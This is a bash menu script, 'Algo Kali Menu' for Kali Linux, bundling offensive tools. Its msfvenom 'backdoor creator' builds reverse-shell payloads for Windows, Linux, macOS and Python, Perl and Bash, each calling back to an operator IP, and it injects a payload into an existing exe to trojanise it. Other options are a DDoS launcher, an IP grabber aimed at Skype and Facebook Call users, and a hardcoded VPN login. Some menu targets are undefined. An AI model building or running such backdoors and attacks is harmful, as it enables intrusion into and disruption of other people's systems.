#!/bin/bash
BLACK='\e[0;30m'
BLUE='\e[0;34m'
GREEN='\e[0;32m'
CYAN='\e[0;36m'
RED='\e[0;31m'
PURPLE='\e[0;35m'
BROWN='\e[0;33m'
LIGHTGRAY='\e[0;37m'
DARKGRAY='\e[1;30m'
LIGHTBLUE='\e[1;34m'
LIGHTGREEN='\e[1;32m'
LIGHTCYAN='\e[1;36m'
LIGHTRED='\e[1;31m'
LIGHTPURPLE='\e[1;35m'
YELLOW='\e[1;33m'
WHITE='\e[1;37m'
NC='\e[0m'

vpn()
{
clear
sleep 1
echo -e " ${RED} "
echo " ▄▀▀▄ ▄▀▀▄  ▄▀▀▄▀▀▀▄  ▄▀▀▄ ▀▄ "
echo "█   █    █ █   █   █ █  █ █ █ "
echo "▐  █    █  ▐  █▀▀▀▀  ▐  █  ▀█ "
echo "   █   ▄▀     █        █   █ "
echo "    ▀▄▀     ▄▀       ▄▀   █  "
echo "           █         █    ▐ "
echo "           ▐         ▐        "
echo -e "${RED}"
echo "What Port Do You Wanna tunnel through?"
echo -e "${WHITE}{${BLUE}1${WHITE}} ${RED}Port 80"
echo -e "${WHITE}{${BLUE}2${WHITE}} ${RED}Port 53"
echo -e "${WHITE}{${BLUE}3${WHITE}} ${RED}Port 443"
echo -e "${WHITE}{${BLUE}4${WHITE}} ${RED}Port 25000"
echo 
echo -e "${RED}Select One Of The Numbers!"
echo
echo -n "Choose Port: "

read port

case "$port" in
	1) cd network && echo "username: vpnbook  password: Bretr8q" && sudo openvpn 80 ;;
	2) cd network && echo "username: vpnbook  password: Bretr8q" && sudo openvpn 53 ;;
	3) cd network && echo "username: vpnbook  password: Bretr8q" && sudo openvpn 443 ;;
	4) cd network && echo "username: vpnbook  password: Bretr8q" && sudo openvpn 25000 ;;
	*) vpn
esac

}

msf()
{
clear
sleep 1
echo -e " ${RED} "
echo " ▄▀▀▄▀▀▀▄  ▄▀▀█▄   ▄▀▀▄ ▀▀▄  ▄▀▀▀▀▄    ▄▀▀▀▀▄   ▄▀▀█▄   ▄▀▀█▄▄ "
echo "█   █   █ ▐ ▄▀ ▀▄ █   ▀▄ ▄▀ █    █    █      █ ▐ ▄▀ ▀▄ █ ▄▀   █"
echo "▐  █▀▀▀▀    █▄▄▄█ ▐     █   ▐    █    █      █   █▄▄▄█ ▐ █    █"
echo "   █       ▄▀   █       █       █     ▀▄    ▄▀  ▄▀   █   █    █"
echo " ▄▀       █   ▄▀      ▄▀      ▄▀▄▄▄▄▄▄▀ ▀▀▀▀   █   ▄▀   ▄▀▄▄▄▄▀ "
echo "█         ▐   ▐       █       █                ▐   ▐   █     ▐ "
echo "▐                     ▐       ▐                        ▐        "
echo -e " ${LIGHTBLUE} "
echo "==============================================================================="
echo -e " ${WHITE} (Mac) (Linux) Payload Backdoor Generator (Windows) ${LIGHTBLUE}"
echo "==============================================================================="
echo
echo -e "${WHITE}{${BLUE}1${WHITE}} ${RED}Create a backdoor payload for Windows Computer"
echo
echo -e "${WHITE}{${BLUE}2${WHITE}} ${RED}Create a backdoor payload for Linux Computer/Server"
echo
echo -e "${WHITE}{${BLUE}3${WHITE}} ${RED}Create a backdoor payload for Mac Computers"
echo
echo -e "${WHITE}{${BLUE}4${WHITE}} ${RED}Create a backdoor payload in scripts such as python/perl/bash"
echo
echo -e "${WHITE}{${BLUE}5${WHITE}} ${RED}Inject a backdoor payload into an exe file"
echo
echo -e "${WHITE}{${BLUE}6${WHITE}} ${RED}Start a windows Payload"
echo -n "Payload_.>  "
read answer
case "$answer" in
	1) msf1 ;;
	2) msf2 ;;
	3) msf3 ;;
	4) msf4 ;;
	5) msf5 ;;
	6) windowspay ;;
	*) clear; msf
esac
}


msf1()
{
	clear
	sleep 1
	echo -e " ${RED} "
	echo " ▄▀▀▄▀▀▀▄  ▄▀▀█▄   ▄▀▀▄ ▀▀▄  ▄▀▀▀▀▄    ▄▀▀▀▀▄   ▄▀▀█▄   ▄▀▀█▄▄ "
	echo "█   █   █ ▐ ▄▀ ▀▄ █   ▀▄ ▄▀ █    █    █      █ ▐ ▄▀ ▀▄ █ ▄▀   █"
	echo "▐  █▀▀▀▀    █▄▄▄█ ▐     █   ▐    █    █      █   █▄▄▄█ ▐ █    █"
	echo "   █       ▄▀   █       █       █     ▀▄    ▄▀  ▄▀   █   █    █"
	echo " ▄▀       █   ▄▀      ▄▀      ▄▀▄▄▄▄▄▄▀ ▀▀▀▀   █   ▄▀   ▄▀▄▄▄▄▀ "
	echo "█         ▐   ▐       █       █                ▐   ▐   █     ▐ "
	echo "▐                     ▐       ▐                        ▐        "
	echo -e " ${LIGHTPURPLE} "
	echo "=========================================="
	echo "Welcome to the MSFVenom Payload Generator!"
	echo "=========================================="
	echo 
	echo -e "${WHITE}Windows OS Backdoor Edition"
	echo
	echo -n "Enter Name Of File: "
	read name
	echo
	echo -n "Enter Your IP Here: "
	read ip
	echo
	echo -n "Enter Your Port: "
	read port
	echo
	echo "Generating payload....."
	msfvenom -p windows/meterpreter/reverse_tcp lhost=$ip lport=$port -f exe > $name.exe 
}

msf2()
{
	clear
	sleep 1
	echo -e " ${RED} "
	echo " ▄▀▀▄▀▀▀▄  ▄▀▀█▄   ▄▀▀▄ ▀▀▄  ▄▀▀▀▀▄    ▄▀▀▀▀▄   ▄▀▀█▄   ▄▀▀█▄▄ "
	echo "█   █   █ ▐ ▄▀ ▀▄ █   ▀▄ ▄▀ █    █    █      █ ▐ ▄▀ ▀▄ █ ▄▀   █"
	echo "▐  █▀▀▀▀    █▄▄▄█ ▐     █   ▐    █    █      █   █▄▄▄█ ▐ █    █"
	echo "   █       ▄▀   █       █       █     ▀▄    ▄▀  ▄▀   █   █    █"
	echo " ▄▀       █   ▄▀      ▄▀      ▄▀▄▄▄▄▄▄▀ ▀▀▀▀   █   ▄▀   ▄▀▄▄▄▄▀ "
	echo "█         ▐   ▐       █       █                ▐   ▐   █     ▐ "
	echo "▐                     ▐       ▐                        ▐        "
	echo -e " ${LIGHTGREEN} "
	echo "=========================================="
	echo "Welcome to the MSFVenom Payload Generator!"
	echo "=========================================="
	echo
	echo -e "${WHITE}Linux OS Backdoor Edition"
	echo
	echo -n "Enter Name Of File: "
	read name
	echo
	echo -n "Enter Your IP Here: "
	read ip
	echo
	echo -n "Enter Your Port: "
	read port
	echo
	echo "Generating payload....."
	msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f elf > $name.elf 
}

msf3()
{
	clear
	sleep 1
	echo -e " ${RED} "
	echo " ▄▀▀▄▀▀▀▄  ▄▀▀█▄   ▄▀▀▄ ▀▀▄  ▄▀▀▀▀▄    ▄▀▀▀▀▄   ▄▀▀█▄   ▄▀▀█▄▄ "
	echo "█   █   █ ▐ ▄▀ ▀▄ █   ▀▄ ▄▀ █    █    █      █ ▐ ▄▀ ▀▄ █ ▄▀   █"
	echo "▐  █▀▀▀▀    █▄▄▄█ ▐     █   ▐    █    █      █   █▄▄▄█ ▐ █    █"
	echo "   █       ▄▀   █       █       █     ▀▄    ▄▀  ▄▀   █   █    █"
	echo " ▄▀       █   ▄▀      ▄▀      ▄▀▄▄▄▄▄▄▀ ▀▀▀▀   █   ▄▀   ▄▀▄▄▄▄▀ "
	echo "█         ▐   ▐       █       █                ▐   ▐   █     ▐ "
	echo "▐                     ▐       ▐                        ▐        "
	echo -e " ${CYAN} "
	echo "=========================================="
	echo "Welcome to the MSFVenom Payload Generator!"
	echo "=========================================="
	echo
	echo -e "${WHITE}Mac OS Backdoor Edition"
	echo
	echo -n "Enter Name Of File: "
	read name
	echo
	echo -n "Enter Your IP Here: "
	read ip
	echo
	echo -n "Enter Your Port: "
	read port
	echo
	echo "Generating payload....."
	msfvenom -p osx/x86/shell_reverse_tcp LHOST=$ip LPORT=$port -f macho > $name.macho 
}


msf4()
{
	clear
	sleep 1
	echo -e " ${RED} "
	echo " ▄▀▀▄▀▀▀▄  ▄▀▀█▄   ▄▀▀▄ ▀▀▄  ▄▀▀▀▀▄    ▄▀▀▀▀▄   ▄▀▀█▄   ▄▀▀█▄▄ "
	echo "█   █   █ ▐ ▄▀ ▀▄ █   ▀▄ ▄▀ █    █    █      █ ▐ ▄▀ ▀▄ █ ▄▀   █"
	echo "▐  █▀▀▀▀    █▄▄▄█ ▐     █   ▐    █    █      █   █▄▄▄█ ▐ █    █"
	echo "   █       ▄▀   █       █       █     ▀▄    ▄▀  ▄▀   █   █    █"
	echo " ▄▀       █   ▄▀      ▄▀      ▄▀▄▄▄▄▄▄▀ ▀▀▀▀   █   ▄▀   ▄▀▄▄▄▄▀ "
	echo "█         ▐   ▐       █       █                ▐   ▐   █     ▐ "
	echo "▐                     ▐       ▐                        ▐        "
	echo
	echo -e "${CYAN}"
	echo "=========================================="
	echo "Welcome to the MSFVenom Payload Generator!"
	echo "=========================================="
	echo
	echo "Coding Scripts Backdoor Edition"
	echo
	echo "What Language?"
	echo
	echo -e "${WHITE}{${BLUE}1${WHITE}} ${RED}Python"
	echo
	echo -e "${WHITE}{${BLUE}2${WHITE}} ${RED}Perl"
	echo
	echo -e "${WHITE}{${BLUE}3${WHITE}} ${RED}Bash"
	echo
	echo -n "Choice: "
	echo
	read Choice
	case "$Choice" in
		1)
		echo -n "Enter IP: "
		read ip
		echo
		echo -n "Enter Port: "
		read port
		echo
		echo -n "Enter name: "
		read name
		echo 
		echo "Generating payload...."
		msfvenom -p cmd/unix/reverse_python LHOST=$ip LPORT=$port -f raw > $name.py
		;;
		2)
		echo -n "Enter IP: "
		read ip
		echo
		echo -n "Enter Port: "
		read port
		echo
		echo -n "Enter name: "
		read name
		echo
		echo "Generating payload...."
		msfvenom -p cmd/unix/reverse_perl LHOST=$ip LPORT=$port -f raw > $name.pl
		;;
		3)
		echo -n "Enter IP: "
		read ip
		echo
		echo -n "Enter Port: "
		read port
		echo
		echo -n "Enter name: "
		read name
		echo
		echo "Generating payload...."
		msfvenom -p cmd/unix/reverse_bash LHOST=$ip LPORT=$port -f raw > $name.sh
	esac
}

msf5()
{
	clear
	sleep 1
	echo -e " ${RED} "
	echo " ▄▀▀▄▀▀▀▄  ▄▀▀█▄   ▄▀▀▄ ▀▀▄  ▄▀▀▀▀▄    ▄▀▀▀▀▄   ▄▀▀█▄   ▄▀▀█▄▄ "
	echo "█   █   █ ▐ ▄▀ ▀▄ █   ▀▄ ▄▀ █    █    █      █ ▐ ▄▀ ▀▄ █ ▄▀   █"
	echo "▐  █▀▀▀▀    █▄▄▄█ ▐     █   ▐    █    █      █   █▄▄▄█ ▐ █    █"
	echo "   █       ▄▀   █       █       █     ▀▄    ▄▀  ▄▀   █   █    █"
	echo " ▄▀       █   ▄▀      ▄▀      ▄▀▄▄▄▄▄▄▀ ▀▀▀▀   █   ▄▀   ▄▀▄▄▄▄▀ "
	echo "█         ▐   ▐       █       █                ▐   ▐   █     ▐ "
	echo "▐                     ▐       ▐                        ▐        "
	echo -e " ${BLUE} "
	echo -e "${WHITE}=============================================================="
	echo -e "${WHITE}==== ${BLUE} Welcome To The Payload Exe Injector ${WHITE} ===="
	echo -e "${WHITE}=============================================================="
	echo -e "${RED}"
	echo
	echo -n "Enter your IP here: "
	read ip
	echo
	echo -n "Enter your port here: "
	read port
	echo
	echo -n "Name of the exe you want to inject a payload into: "
	read exe
	echo
	echo -n "Name of the output you want: "
	read name
	echo
	echo "Generating Payload...."
	msfvenom -k -p windows/meterpreter/reverse_tcp lhost=$ip lport=$port exitfunc=none -x $exe.exe -f exe > $name.exe
}



update()
{
	clear
	sleep 1
	echo -e "${PURPLE}"
	echo " ▄▀▀▄ ▄▀▀▄  ▄▀▀▄▀▀▀▄  ▄▀▀█▄▄   ▄▀▀█▄   ▄▀▀▀█▀▀▄  ▄▀▀█▄▄▄▄"
	echo "█   █    █ █   █   █ █ ▄▀   █ ▐ ▄▀ ▀▄ █    █  ▐ ▐  ▄▀   ▐"
	echo "▐  █    █  ▐  █▀▀▀▀  ▐ █    █   █▄▄▄█ ▐   █       █▄▄▄▄▄ "
	echo "  █    █      █        █    █  ▄▀   █    █        █    ▌ "
	echo "   ▀▄▄▄▄▀   ▄▀        ▄▀▄▄▄▄▀ █   ▄▀   ▄▀        ▄▀▄▄▄▄ "
	echo "           █         █     ▐  ▐   ▐   █          █    ▐ "
	echo "           ▐         ▐                ▐          ▐      "
	echo 
	echo "Do you want to continue to update? (y/n)"
	read ynn
	case "$ynn" in
		y)
		sudo echo 'deb http://http.kali.org/kali kali-rolling main non-free contrib' > /etc/apt/sources.list
		sudo dpkg --add-architecture i386
		sudo apt-get update -y
		sudo apt-get install kali-linux-all -y
		sudo apt-get upgrade -y
		sudo apt-get dist-upgrade -y
		menu
		;;
		n) menu ;;
		*)
		update
	esac
}

dstat1()
{
	clear
	sleep 1
	echo -e "${GREEN}"
	echo " ▄▀▀█▄▄   ▄▀▀▀▀▄  ▄▀▀▀█▀▀▄  ▄▀▀█▄   ▄▀▀▀█▀▀▄ "
	echo "█ ▄▀   █ █ █   ▐ █    █  ▐ ▐ ▄▀ ▀▄ █    █  ▐"
	echo "▐ █    █    ▀▄   ▐   █       █▄▄▄█ ▐   █"
	echo "  █    █ ▀▄   █     █       ▄▀   █    █"
	echo " ▄▀▄▄▄▄▀  █▀▀▀    ▄▀       █   ▄▀   ▄▀"
	echo "█     ▐   ▐      █         ▐   ▐   █ "
	echo "▐                ▐                 ▐ "
	echo
	echo -e  "${CYAN}"
	echo "==============================="
	echo "===Welcome to DStat Fuck Boy==="
	echo "==============================="
	echo
	dstat
	echo
	echo -e "${CYAN}"
	echo
	read -p "Press enter to continue...."
	menu
}

tcp()
{
	clear
	sleep 1
	echo -e "${CYAN}"
	echo " ▄▀▀▀█▀▀▄  ▄▀▄▄▄▄   ▄▀▀▄▀▀▀▄"
	echo "█    █  ▐ █ █    ▌ █   █   █"
	echo "▐   █     ▐ █      ▐  █▀▀▀▀"
	echo "   █        █         █ "
	echo " ▄▀        ▄▀▄▄▄▄▀  ▄▀ "
	echo "█         █     ▐  █ "
	echo "▐         ▐        ▐ "
	echo
	echo -e "${PURPLE}"
	echo
	echo "[*]Checking TCP Connections for backdoors...[*]"
	echo
	netstat -p | grep tcp
	echo 
	read -p "Press enter to continue...."
	menu

}



grab()
{
	clear
	sleep 1
	echo -e "${YELLOW}"
	echo " ▄▀▀█▀▄    ▄▀▀▄▀▀▀▄ "
	echo "█   █  █  █   █   █ "
	echo "▐   █  ▐  ▐  █▀▀▀▀ "
	echo "    █        █     "
	echo " ▄▀▀▀▀▀▄   ▄▀      "
	echo "█       █ █        "
	echo "▐       ▐ ▐     "
	echo -e "${LIGHTGRAY}"
	echo "=================================================="
	echo "Welcome to the IP Grabber for skype and FB Call :)"
	echo "=================================================="
	echo
	read -p "Press enter to continue the IP logger..."
	echo
	clear
	netstat -tupan | grep skype
	echo
	read -p "Press enter to continue...."
	menu

}

anon() 
{
	clear
	sleep 1 
	echo -e "${LIGHTGREEN}"
	echo "==========================="
	echo "===Welcome to Anonsurf!!==="
	echo "==========================="
	echo
	echo -e "${RED}Anonsurf is a vpn that runs all of your network traffic network through the tor network"
	echo 
	echo -e "${WHITE}{${BLUE}1${WHITE}} ${RED}Install Anonsurf (If you dont have it installed)"
	echo -e "${WHITE}{${BLUE}2${WHITE}} ${RED}Start Anonsurf Services and Change Identity Every Minute"
	echo 
	echo -n "Enter Choice Here: "
	read answer
	case $answer in
		1) cd kali-anonsurf; sudo ./installer.sh ;;
		2) sudo anonsurf start; change ;;
		*) clear; anon ;;
	esac
}

change()
{
	echo -e "${WHITE}Tor Identity Changing"
	echo
	x=1
	while [ $x -eq 1 ]
	do
		sudo anonsurf change
		sleep 90
	done
}

scans() 
{
	clear
	sleep 1
	echo -e "${YELLOW}"	
	echo "========================="
	echo -e "Welcome To NMap Menu for network scans=="
	echo "========================="
	echo "Pick an Option Below"
	echo "{1} Regular Scan"
	echo "{2} OS Scan + Regular Scan"
	echo -n "Scan_.> "
	read answer
	case $answer in
		1) scan1 ;;
		2) scan2 ;;
		*) scan
	esac

}

scan1() 
{
	clear
	echo -n "Put IP or URL Here: "
	read ip
	echo
	echo -n "Enter Name Of The File: "
	read name
	echo
	nmap -v -A $ip > $name.scan
	scan
}

getold()
{
	clear
	sleep 1
	echo -e "${WHITE}"
	echo "Do you want to boot up in terminal or desktop? (t/d)"
	read nyes
	case $nyes in 
		t) changebackterm ;;
		d) changebackdesk ;;
		*) getold
	esac
}

changebackterm()
{
	echo -e "${RED}"
	echo 'Changing The Kali Linux StartUp Menu To Using a Terminal'
	echo
	sudo cp /etc/X11/default-display-manager /etc/X11/default-display-manager.backup
	echo "" > /etc/X11/default-display-manager
	sudo echo "" > /etc/X11/default-display-manager
      	echo "" > /etc/X11/default-display-manager
  	sudo cp /etc/X11/default-display-manager /etc/X11/default-display-manager.backup
	sudo cp /etc/gdm3/daemon.conf /etc/gdm3/daemon.conf.backup
	sudo ln -s /usr/sbin/gdm3 /usr/bin/startx
	echo -e "${WHITE}"
	echo 'Now You Reboot your device and it will boot up into a terminal.'
	echo
	echo 'Use the Command startx To Pull Up The Desktop!!!'
	echo
	echo 'Going back to the Main Menu! Just Wait.'
	sleep 4
	menu
}

changebackdesk()
{
	echo -e "${WHITE}"
	echo 'Changing The Kali Linux StartUp Menu To Using The Desktop'
	sudo rm /usr/bin/startx
	sudo cp /etc/X11/default-display-manager.backup /etc/X11/default-display-manager
	sudo cp /etc/X11/default-display-manager.backup /etc/X11/default-display-manager
	sudo cp /etc/gdm3/daemon.conf.backup /etc/gdm3/daemon.conf
	echo -e "${RED}"
	echo "Now You Reboot your Device and it will boot up into the desktop."
	echo
	echo "Use the Command startx to Pull Up The Desktop!!!"
	echo
	echo "Going back to the Main Menu! Just Wait."
	sleep 4
	menu
}



ddoskid()
{
	clear
	sleep 1
	echo -e "${RED}"
	echo "==============================="
	echo "=== Get Ready To DDos Kidz ===="
	echo "==============================="
	echo
	read -p "Press enter to continue...."
	python3 tcp.py
}

menu()
{
clear
sleep 1
echo -e " ${RED} "
echo " ▄▀▀█▄   ▄▀▀▀▀▄      ▄▀▀▀▀▄    ▄▀▀▀▀▄ "
echo "▐ ▄▀ ▀▄ █    █      █         █      █"
echo "  █▄▄▄█ ▐    █      █    ▀▄▄  █      █ "
echo " ▄▀   █     █       █     █ █ ▀▄    ▄▀ "
echo "█   ▄▀    ▄▀▄▄▄▄▄▄▀ ▐▀▄▄▄▄▀ ▐   ▀▀▀▀   "
echo "▐   ▐     █         ▐                  "
echo "          ▐                      "
echo -e " ${DARKGRAY} "
echo "========================================"
echo "=======    A Menu For Kali Linux  ======"
echo "========  Algo Kali Menu V 1.4.1  ======"
echo "=======  Creator: Eth0n3t  ============="
echo "========================================"
echo
echo -e "${WHITE}{${BLUE}1${WHITE}} ${RED}VPN Book Tunnels Through"
echo
echo -e "${WHITE}{${BLUE}2${WHITE}} ${RED}MSFVenom Backdoor Creator"
echo
echo -e "${WHITE}{${BLUE}3${WHITE}} ${RED}Install Kali Linux Tools and Update Them"
echo
echo -e "${WHITE}{${BLUE}4${WHITE}} ${RED}DSTAT Option"
echo
echo -e "${WHITE}{${BLUE}5${WHITE}} ${RED}Check Connections For BackDoors"
echo
echo -e "${WHITE}{${BLUE}6${WHITE}} ${RED}IP Grabber For VOIP (Skype, FB Call)"
echo
echo -e "${WHITE}{${BLUE}7${WHITE}} ${RED}AnonSurf Menu (With Installer)"
echo
echo -e "${WHITE}{${BLUE}8${WHITE}} ${RED}NMap Menu For Test Scans (Still Editing)"
echo
echo -e "${WHITE}{${BLUE}9${WHITE}} ${RED}Get Old BackTrack5 StartUp in Terminal For Kali Linux"
echo
echo -e "${WHITE}{${BLUE}10${WHITE}} ${RED}Script Maker Through Vim and Bash!"
echo
echo -e "${WHITE}{${BLUE}11${WHITE}} ${RED}Dosing Script Skiddy"
echo
echo -e "${WHITE}Press n and Hit Enter To Go To The Next Page"
echo
echo "Page <1/2>"
echo
echo -n "Algo_.>  "
read answer
echo

case $answer in
	1) vpn ;;
	2) msf ;;
	3) update ;;
	4) dstat1 ;;
	5) tcp ;;
	6) grab ;;
	7) anon ;;
	8) scans ;;
	9) getold ;;
	10) makers ;;
	11) ddoskid ;;
	n) nextp ;;
	*) clear; menu
esac
}

menu
